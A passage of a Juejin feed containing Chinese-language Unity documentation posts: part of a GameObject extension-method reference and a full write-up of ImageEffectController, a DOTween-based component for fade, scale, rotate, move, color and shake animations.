<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 安全获取任意组件，存在/不存在时分别执行回调并打印日志</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="onComponentFound"&gt;</span>组件存在时回调<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="onComponentNotFound"&gt;</span>组件不存在时回调<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">GetComponentSafe</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">
    <span class="hljs-keyword">this</span> GameObject gameObject,
    Action&lt;T&gt; onComponentFound = <span class="hljs-literal">null</span>,
    Action onComponentNotFound = <span class="hljs-literal">null</span></span>)
    <span class="hljs-keyword">where</span> T : Component
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">go.GetComponentSafe&lt;Rigidbody&gt;(
    <span class="hljs-attr">rb</span> =&gt; rb.mass = <span class="hljs-number">10</span>f,
    () =&gt; Debug.Log("需要添加刚体组件！")
)<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-9">显示/隐藏快捷方法</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Show</span><span class="hljs-params">(<span class="hljs-built_in">this</span> GameObject gameObject)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Hide</span><span class="hljs-params">(<span class="hljs-built_in">this</span> GameObject gameObject)</span>
</code></pre>
<p><strong>简洁替代</strong>：</p>
<pre><code class="hljs language-ruby" lang="ruby">button.<span class="hljs-title class_">Show</span>();      <span class="hljs-regexp">//</span> 等价于 button.<span class="hljs-title class_">SetActive</span>(<span class="hljs-literal">true</span>);
effect.<span class="hljs-title class_">Hide</span>();      <span class="hljs-regexp">//</span> 等价于 effect.<span class="hljs-title class_">SetActive</span>(<span class="hljs-literal">false</span>);
</code></pre>
<hr/>
<h3 data-id="heading-10">子物体查找</h3>
<h4 data-id="heading-11">FindChild / FindChildSafe</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 查找指定名称的直接子物体</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject <span class="hljs-title">FindChild</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, <span class="hljs-built_in">string</span> childName</span>)

<span class="hljs-comment">/// &lt;summary&gt;</span>
<span class="hljs-comment">/// 安全查找子物体，不存在返回 null</span>
<span class="hljs-comment">/// &lt;/summary&gt;</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject <span class="hljs-title">FindChildSafe</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, <span class="hljs-built_in">string</span> childName</span>)
</span></code></pre>
<p><strong>区别</strong>：FindChild 使用 transform.Find()，若路径错误会抛异常；FindChildSafe 更安全。</p>
<h4 data-id="heading-12">GetAllChildren</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 获取所有直接子物体（不包含子孙）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;GameObject&gt; <span class="hljs-title">GetAllChildren</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject</span>)
</span></code></pre>
<hr/>
<h3 data-id="heading-13">层级（Layer）管理</h3>
<h4 data-id="heading-14">SetLayer（两种重载）</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 递归设置物体及所有子物体的 Layer（int）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetLayer</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, <span class="hljs-built_in">int</span> layer</span>)

<span class="hljs-comment">/// &lt;summary&gt;</span>
<span class="hljs-comment">/// 递归设置 Layer（传入层名称字符串）</span>
<span class="hljs-comment">/// &lt;/summary&gt;</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetLayer</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, <span class="hljs-built_in">string</span> layerName</span>)
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">player</span><span class="hljs-selector-class">.SetLayer</span>(<span class="hljs-string">"Player"</span>);          <span class="hljs-comment">// 使用层名</span>
<span class="hljs-selector-tag">uiRoot</span><span class="hljs-selector-class">.SetLayer</span>(LayerMask.<span class="hljs-built_in">NameToLayer</span>(<span class="hljs-string">"UI"</span>));
</code></pre>
<hr/>
<h3 data-id="heading-15">其他常用操作</h3>
<h4 data-id="heading-16">GetParent</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 获取父物体，若无父物体返回 null</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject <span class="hljs-title">GetParent</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject</span>)
</span></code></pre>
<h4 data-id="heading-17">FindAndActivate</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 全局查找物体并激活（GameObject.Find + SetActive）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject <span class="hljs-title">FindAndActivate</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, <span class="hljs-built_in">string</span> name</span>)
</span></code></pre>
<p><strong>注意</strong>：GameObject.Find 性能较低，仅建议在初始化或少量使用时调用。</p>
<h4 data-id="heading-18">Clone</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 在指定位置和旋转克隆物体</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject <span class="hljs-title">Clone</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, Vector3 position, Quaternion rotation</span>)
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">bullet</span> = bulletPrefab.Clone(spawnPoint.position, spawnPoint.rotation)<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-19">SetTag</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 设置 Tag，仅在不同时才修改</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetTag</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, <span class="hljs-built_in">string</span> tag</span>)
</span></code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ImageEffectController]]></title>    <link>https://juejin.cn/post/7603004323911647238</link>    <guid>https://juejin.cn/post/7603004323911647238</guid>    <pubDate>2026-02-05T06:37:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603004323911647238" data-draft-id="7602900131542253609" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ImageEffectController"/> <meta itemprop="keywords" content="Unity3D"/> <meta itemprop="datePublished" content="2026-02-05T06:37:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Wembanyama"/> <meta itemprop="url" content="https://juejin.cn/user/3699191947468376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ImageEffectController
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3699191947468376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Wembanyama
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:37:48.000Z" title="Thu Feb 05 2026 06:37:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述（Overview）</h2>
<p>ImageEffectController 是一个使用 <strong>DOTween</strong> 实现多种 3D/2D 物体视觉动画效果的组件，挂载在带有 Renderer 的 GameObject 上。</p>
<p>主要功能包括：</p>
<ul>
<li>物体整体动画序列（缩放 + 淡入 + 旋转 + 移动 + 颜色变化 + 抖动）</li>
<li>支持单独触发每种动画效果</li>
<li>支持重置物体状态（位置、缩放、颜色、透明度、激活状态）</li>
<li>动画参数全部公开，可在 Inspector 中调节</li>
<li>适用于 UI 图片特效、3D 物体展示、教学引导、物品出现/消失等场景</li>
</ul>
<p><strong>核心依赖</strong>：</p>
<ul>
<li>DOTween（所有动画均使用 DOTween 实现）</li>
<li>需要物体上有 Renderer 组件（用于材质透明度/颜色控制）</li>
</ul>
<p><strong>典型使用方式</strong>：</p>
<ul>
<li>挂载脚本后，在 Inspector 配置参数</li>
<li>调用 AnimateImage() 播放完整组合动画</li>
<li>或单独调用 FadeIn()、Scale() 等方法触发单一效果</li>
</ul>
<hr/>
<h2 data-id="heading-1">组件属性（Inspector 可调参数）</h2>































































































<table><thead><tr><th>参数名</th><th>类型</th><th>默认值示例</th><th>说明</th></tr></thead><tbody><tr><td>targetScale</td><td>Vector3</td><td>(2, 2, 1)</td><td>目标缩放值（通常 z 保持 1）</td></tr><tr><td>scaleDuration</td><td>float</td><td>1f</td><td>缩放动画持续时间（秒）</td></tr><tr><td>fadeDuration</td><td>float</td><td>1f</td><td>淡入/淡出 / 颜色变化的持续时间</td></tr><tr><td>fadeIn</td><td>bool</td><td>true</td><td>是否执行淡入（材质 alpha → 1）</td></tr><tr><td>fadeOut</td><td>bool</td><td>false</td><td>是否执行淡出（材质 alpha → 0）</td></tr><tr><td>targetColor</td><td>Color</td><td>Color.red</td><td>目标颜色（当 changeColor = true 时使用）</td></tr><tr><td>changeColor</td><td>bool</td><td>false</td><td>是否执行颜色渐变</td></tr><tr><td>offScreenPosition</td><td>Vector3</td><td>(-Screen.width, 0, 0)</td><td>初始屏幕外位置（用于滑入效果）</td></tr><tr><td>onScreenPosition</td><td>Vector3</td><td>(0, 0, 0)</td><td>目标屏幕内位置</td></tr><tr><td>moveDuration</td><td>float</td><td>1f</td><td>移动动画持续时间</td></tr><tr><td>rotationAngle</td><td>float</td><td>360f</td><td>旋转角度（绕 Z 轴）</td></tr><tr><td>rotateDuration</td><td>float</td><td>2f</td><td>旋转动画持续时间</td></tr><tr><td>shakeStrength</td><td>Vector3</td><td>(20, 20, 0)</td><td>抖动强度（x/y 平面抖动）</td></tr><tr><td>shakeDuration</td><td>float</td><td>1f</td><td>抖动持续时间</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">核心方法</h2>
<h3 data-id="heading-3">AnimateImage</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 播放完整的组合动画序列（推荐入口方法）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 顺序：淡入/淡出 → 缩放 → 旋转 → 移动 → 颜色变化（并行） → 抖动</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 动画完成后打印 "All image effects completed"</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">AnimateImage</span>()
</span></code></pre>
<p><strong>执行流程</strong>：</p>
<ol>
<li>激活物体 gameObject.SetActive(true)</li>
<li>创建 DOTween Sequence</li>
<li>依次/并行添加各种动画</li>
<li>最后抖动效果</li>
<li>OnComplete 回调打印完成日志</li>
</ol>
<p><strong>典型调用</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 在其他脚本中</span>
GetComponent&lt;ImageEffectController&gt;()<span class="hljs-selector-class">.AnimateImage</span>();
</code></pre>
<hr/>
<h3 data-id="heading-4">ResetImage</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 重置物体到初始状态（常用于下次重新播放前准备）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - 位置回到 offScreenPosition</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - 缩放回到 (1,1,1)</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - 颜色恢复为白色</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - 透明度设为 0</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> - 物体设为非激活</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ResetImage</span>()
</span></code></pre>
<p><strong>推荐用法</strong>：在动画播放结束或需要重新展示时调用。</p>
<hr/>
<h3 data-id="heading-5">单一效果方法（可单独调用）</h3>













































<table><thead><tr><th>方法名</th><th>功能描述</th><th>动画核心调用</th></tr></thead><tbody><tr><td>FadeIn()</td><td>材质淡入（alpha → 1）</td><td>_material.DOFade(1f, fadeDuration)</td></tr><tr><td>FadeOut()</td><td>材质淡出（alpha → 0）</td><td>_material.DOFade(0f, fadeDuration)</td></tr><tr><td>Scale()</td><td>缩放到 targetScale</td><td>transform.DOScale(targetScale, scaleDuration)</td></tr><tr><td>Rotate()</td><td>绕 Z 轴旋转 rotationAngle 度</td><td>transform.DORotate(..., RotateMode.FastBeyond360)</td></tr><tr><td>Move()</td><td>从 offScreenPosition 移动到 onScreenPosition</td><td>transform.DOLocalMove(onScreenPosition, moveDuration)</td></tr><tr><td>ChangeColor()</td><td>材质颜色渐变到 targetColor</td><td>_material.DOColor(targetColor, fadeDuration)</td></tr><tr><td>Shake()</td><td>位置抖动</td><td>transform.DOShakePosition(...)</td></tr></tbody></table>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">effect</span> = GetComponent&lt;ImageEffectController&gt;()<span class="hljs-comment">;</span>

// 只想让物体抖动一下
effect.Shake()<span class="hljs-comment">;</span>

// 单独做淡入 + 放大
effect.FadeIn()<span class="hljs-comment">;</span>
effect.Scale()<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h2 data-id="heading-6">内部字段（私有）</h2>




















<table><thead><tr><th>字段名</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>_renderer</td><td>Renderer</td><td>物体的 Renderer 组件</td></tr><tr><td>_material</td><td>Material</td><td>当前使用的材质（取自 renderer）</td></tr></tbody></table>
<p><strong>注意</strong>：脚本在 Start() 中自动获取 _renderer 和 _material，若物体没有 Renderer 会导致空引用。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UIExtensions]]></title>    <link>https://juejin.cn/post/7603004323911729158</link>    <guid>https://juejin.cn/post/7603004323911729158</guid>    <pubDate>2026-02-05T06:44:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603004323911729158" data-draft-id="7602928783596961798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UIExtensions"/> <meta itemprop="keywords" content="Unity3D"/> <meta itemprop="datePublished" content="2026-02-05T06:44:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Wembanyama"/> <meta itemprop="url" content="https://juejin.cn/user/3699191947468376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UIExtensions
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3699191947468376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Wembanyama
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:44:49.000Z" title="Thu Feb 05 2026 06:44:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 